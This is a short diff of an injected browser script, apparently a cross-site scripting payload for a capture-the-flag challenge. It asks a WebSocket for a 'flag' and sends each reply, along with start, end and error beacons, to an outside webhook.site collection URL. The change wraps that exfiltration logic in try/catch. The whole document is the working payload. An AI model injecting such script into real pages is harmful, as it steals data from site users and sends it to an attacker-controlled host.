@@ -1,11 +1,16 @@
 <script>
     fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=started`)
-    ws.onmessage = (event) => {
-        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`)
-        .catch((err) => {
-            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=error`)
-        });
-    };
-    ws.send('flag')
-    fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=end`)
+    try {
+        ws.onmessage = (event) => {
+            fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${event.data}`)
+            .catch((err) => {
+                fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=error`)
+            });
+        };
+        ws.send('flag')
+        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=end`)
+    } catch (error) {
+        fetch(`https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=${error.message}`)
+    }
+    
 </script>
